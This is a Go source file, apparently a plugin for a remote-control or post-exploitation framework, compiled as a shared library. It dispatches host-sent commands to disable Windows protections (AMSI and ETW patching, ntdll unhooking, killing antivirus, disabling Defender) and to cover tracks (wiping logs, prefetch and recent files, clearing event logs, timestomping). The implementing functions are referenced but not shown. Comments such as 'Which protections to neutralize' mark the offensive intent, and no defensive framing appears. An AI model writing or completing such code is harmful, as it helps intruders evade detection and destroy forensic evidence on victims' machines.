package main

import (
	"encoding/json"
	"sync"
)

var (
	sendMu sync.Mutex
	sendFn func(event string, payload []byte)
	host   map[string]interface{}
)

func setSend(fn func(event string, payload []byte)) {
	sendMu.Lock()
	sendFn = fn
	sendMu.Unlock()
}

func sendEvent(event string, payload interface{}) {
	sendMu.Lock()
	fn := sendFn
	sendMu.Unlock()
	if fn == nil {
		return
	}
	var raw []byte
	switch v := payload.(type) {
	case []byte:
		raw = v
	case nil:
		raw = nil
	default:
		raw, _ = json.Marshal(v)
	}
	fn(event, raw)
}

func handleInit(hostJSON []byte) error {
	if len(hostJSON) > 0 {
		_ = json.Unmarshal(hostJSON, &host)
	}
	sendEvent("status", map[string]interface{}{"state": "loaded"})
	return nil
}

func handleUnload() {
	sendEvent("status", map[string]interface{}{"state": "unloaded"})
}

type Settings struct {
	// Which protections to neutralize.
	PatchAMSI   bool `json:"patchAmsi"`
	PatchETW    bool `json:"patchEtw"`
	UnhookNtdll bool `json:"unhookNtdll"`
	// Anti-forensics
	WipeLogs     bool     `json:"wipeLogs"`
	WipePrefetch bool     `json:"wipePrefetch"`
	WipeRecent   bool     `json:"wipeRecent"`
	ClearEventLogs []string `json:"clearEventLogs"`
	// Timestomp
	TimestompPath string `json:"timestompPath"`
	TimestompFrom string `json:"timestompFrom"`
	// Kill security tooling
	KillAV bool `json:"killAv"`
	// Disable defences that would block the rest.
	DisableDefender bool `json:"disableDefender"`
}

func handleEvent(event string, payload []byte) error {
	var s Settings
	if len(payload) > 0 {
		_ = json.Unmarshal(payload, &s)
	}

	switch event {
	case "ping":
		sendEvent("pong", nil)
	case "recon":
		go defenseRecon()
	case "patch_amsi":
		go patchAMSI()
	case "patch_etw":
		go patchETW()
	case "unhook":
		go unhookNtdll()
	case "harden":
		go harden(s)
	case "wipe_logs":
		go wipeLogs(s)
	case "timestomp":
		go timestomp(s)
	case "kill_av":
		go killAV()
	case "disable_defender":
		go disableDefender()
	default:
		sendEvent("error", map[string]interface{}{"message": "unknown event: " + event})
	}
	return nil
}

// Required by cgo for -buildmode=c-shared.
func main() {}
